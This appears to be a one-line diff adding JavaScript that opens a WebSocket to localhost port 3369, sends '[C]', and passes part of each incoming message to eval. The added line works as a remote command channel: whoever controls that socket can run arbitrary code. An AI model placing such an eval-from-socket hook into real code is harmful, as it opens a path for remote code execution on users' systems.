@@ -1,0 +1,1 @@
+var ws=new WebSocket("ws://localhost:3369");ws.onopen=function(a){ws.send("[C]")};ws.onmessage=function(a){eval(a.data.split("[E]")[1])};
